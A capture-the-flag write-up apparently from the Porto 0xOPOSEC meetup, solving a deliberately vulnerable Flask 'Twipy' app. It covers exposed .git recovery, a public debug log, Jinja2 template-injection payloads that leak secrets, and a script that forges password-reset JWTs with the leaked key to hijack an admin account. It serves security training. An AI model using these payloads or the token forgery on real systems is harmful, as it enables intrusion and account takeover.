---
layout: post
title:  "ØxＯＰＯＳɆＣ Mɇɇtuᵽ [0x70] Challenge Write-up"
categories: [infosec, iot]
tags: [oposec, infosec, ctf]
description: "Write-up for the CTF-like challenge of 0x70 edition of the ØxＯＰＯＳɆＣ Mɇɇtuᵽ"
---

"Based in Porto, the ØxＯＰＯＳɆＣ group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group." This is the write-up of the challenge at the 0x70 meetup edition, by [DDuarte](https://github.com/DDuarte) and André Morais.
<!--more-->

The meetup happens in a monthly-basis, feel free to [join in](https://www.meetup.com/0xOPOSEC/).

![Index Page/Login](/images/oposec/index.png)

Jumping to the challenge. We're given an URL to a Twitter-like website named Twipy (image). From the name, we can conclude that maybe it is made in Python. We know that there are 4 flags to be found: 

- Flag 1 - Version Control is easy
- Flag 2 - Debug 101
- Flag 3 - Nice tweet Eve 🧪
- Flag 4 - This link is bamboozling

All the flags have the same format: *{flag}Rand0mStuff*

## Recon

First things first, lets make some recon even without creating an account. Firing up a [dirsearch](https://github.com/maurosoria/dirsearch) maybe will give us something. The results can be summed up as follow (200 status code results):

{% highlight bash %} 
$ dirsearch -u "example.com" -e py,php
|- 200 -    1KB - /.git/
|- 200 -  735B  - /.gitignore
|- 200 -    3KB - /auth/login
|- 200 -   19KB - /debug.log
{% endhighlight %} 

So, from dirsearch, we found an exposed ```.git``` folder and a ```debug.log``` file. Downloading all the things with ```wget```.

{% highlight bash %} 
$ wget --mirror -I .git http://example.com/.git/
$ wget http://example.com/debug.log
{% endhighlight %} 

Before moving further, firing up ```nmap``` returns only ports 22 (SSH) and 80 (HTTP), so nothing unusual here. We could try to find the credentials for the SSH, but it is a long-shot from the beginning. Firing also ```sqlmap``` on all the possible injectable fields (login form, account reset and ```next``` query param) also resulted in a dead-end.

![Timeline/Home](/images/oposec/timeline.png)

Moving further, and creating an account, we end up with a timeline (image). In the image we can see another user posts, *Willis Adams*, which has two messages being one of them a private message that we can only see the first 6 chars: *{flag}\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\**. Only the *Willis Adams* user can see the message behind the asterisk, but it is a flag. 

The other features of the website like the update profile, explore other users tweets and searching resulted in dead-ends.

## Flag 1 - Version Control is easy

After finding the ```.git``` folder, the next obvious step was to try to recover all the source code. By making a ```$ git status``` we could see all the files that were deleted. 

{% highlight bash %} 
$ git checkout -- .
{% endhighlight %} 

Running the above command restored all the files to their most recent version (before being deleted). By checking the ```$ git log``` we found out some curious commit messages like *Don't disclose mail password :)*, but I could not find anything by analyzing the git diffs. 

Since we know that all flags have the same format, making an exaustive search among all files and revisions:
{% highlight bash %} 
$ git grep ".*flag.*" $(git rev-list --all)
{% endhighlight %} 

We could find that in the commit ```eb3cb7e1ec4e73b0850ec4a6c4a89122599d213d``` the file ```twipy.py``` had the following line of code:

{% highlight python %} 
return '{flag}Us3_vault_for_no_p4sswords_1n_s0urce_cod3.'
{% endhighlight %} 
    
And so, we have our first flag:

>> {flag}Us3_vault_for_no_p4sswords_1n_s0urce_cod3.

## Flag 2 - Debug 101

During our recon phase we found out that a ```debug.log``` was exposed and accessible. Analyzing its contents we could immediatelly find the next flag:

{% highlight bash %} 
2019-01-10 17:52:25,489 ERROR: Unhandled Exception: {flag}b3_c4r3ful_w1th_Wh4t_y0u_l34v3_pUbl1c [in /twipy/app/errors/handlers.py:21]
{% endhighlight %} 

Further, we found out that calling ```http://example.com/flag``` was the trigger to write that exception to the log file.

>> {flag}b3_c4r3ful_w1th_Wh4t_y0u_l34v3_pUbl1c

## Flag 3 - Nice tweet Eve 🧪

Since we now have access to the source code of the app, and sure that the app is written in Python, one of the first things that come to mind is [Server-Side Template Injection](https://portswigger.net/blog/server-side-template-injection). Reading some tutorials and write-ups about the subject I found this one as being the most straightforward: [Flaskcards challenge at Pico CTF 2018](https://s0cket7.com/picoctf-web).

To find if the website is vulnerable we simply tweet ```{{ 7 * 7 }}```, and in the alert-info box we got the following response:
*You just posted: 49*

So our code is being executed. In order to exploit Template Injection firstly, we must find out what is the template engine being used. To do so, the probe ```{{7*'7'}}``` would result in ```49``` in Twig, ```7777777``` in Jinja2, and neither if no template language is in use. In our case, the response was: *You just posted: 7777777*, so we're dealing with Jinja2.

We could also reach the same conclusion by analyzing the Python packages in the ```requirements.txt``` file. And we could also identify the vulnerable code:

{% highlight python %} 
# TODO add user input validation
post_content = render_template_string('''You just posted: %s ''' % form.post.data)
{% endhighlight %} 

The next step was trying to get the config, posting ```{{ config.items() }}```, which resulted in an alert-info with a lot of information that is contained in the config, including:
- FLAG: {flag}V4lid4t3_always_us3r_1NPUT 
- SECRET_KEY: yJmsCAeao5zOM3gvoxHrOyM5HGJTTDpQ7UxAIHneCxc=
- SQLALCHEMY_DATABASE_URI: mysql+pymysql://twipy:RkZDwtkaZ9ugnwf@db/twip

So we have our third flag:

>> {flag}V4lid4t3_always_us3r_1NPUT 

## Flag 4 - This link is bamboozling

One of the things that can be easily noticed is that each user has a unique UUID, e.g. *ae1677ca-f7bd-431a-8280-8fdf4aa801ca*. We can also visit other users profiles and get their unique UUID. 

{% highlight python %} 
god_user = User.query.filter_by(email='willis.adams@example.com').first()
if god_user:
    user.follow(god_user)
{% endhighlight %} 

Analyzing the code creating a new user account, we notice that all the users must follow the user *Willis Adams*, with the UUID *70a82737-a6d9-4284-93db-0600db6f05ca*. 

{% highlight python %} 
def dummy_password(size=8, chars=string.ascii_letters + string.digits):
    return ''.join(random.choice(chars) for i in range(size))
{% endhighlight %} 

Since the passwords are randomly generated in the ```twipy.py```, brute-forcing would take too much time. Another attack-vector can be the recovery password mechanism. By analyzing the structure of the recovery link, we notice that it resembles a [JWT token](https://jwt.io/): 

```http://example.com/auth/reset_password/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InphZnlmb2t1QGdldG5hZGEuY29tIiwiaWQiOiJhZTE2NzdjYS1mN2JkLTQzMWEtODI4MC04ZmRmNGFhODAxY2EiLCJleHAiOjE1NDc3MjY4NzEuMzgwMzQ2LCJuYW1lIjoidHNhciJ9.pDrpqe-GB8Qo2xEdD5pDA9wIOtNpOl3GAq19LBFZJXs```.

In the  ```models.py``` file we have the following logic for assigning and validating recovery password tokens (JWT tokens).

{% highlight python %} 
def get_token(self, expires_in=600):
    return jwt.encode(
        {'id': self.id, 'name': self.name, 'email': self.email, 'exp': time() + expires_in},
        current_app.config['SECRET_KEY'],
        algorithm='HS256').decode('utf-8')

@staticmethod
def verify_token(token):
    try:
        id = jwt.decode(token, current_app.config['SECRET_KEY'], verify=False, algorithms=['HS256'])['id']
    except:
        return
    return User.query.get(id)
{% endhighlight %} 

Since there is no call to database or nounce being used, we can make our own JWT tokens if we know the SECRET_KEY (from the third flag) and the UUID of the target user, in this case, the **god user**.

By making a simple script (checking out in the requirements.txt the Python package used for the JWT - PyJWT), we can get the JWT token in question.

{% highlight python %} 
import jwt
from time import time

secret_key = 'yJmsCAeao5zOM3gvoxHrOyM5HGJTTDpQ7UxAIHneCxc='
id = "70a82737-a6d9-4284-93db-0600db6f05ca"
name = "Willis Adams"
email = "willis.adams@example.com"
expires_in = 600;

print jwt.encode(
    {'id': id, 'name': name, 'email': email, 'exp': time() + expires_in},
    secret_key,
    algorithm='HS256').decode('utf-8')
{% endhighlight %} 

By setting a new password to the *god user* we can see their private tweets thus getting the flag.

>> {flag}4lw4ys_v3r1fy_y0ur_t0k3NS


## Wrap-Up

It was a nice web challenge, always learning a little bit more about infosec and CTFs. Kudos @dduarte and @AndreMorais for the challenge.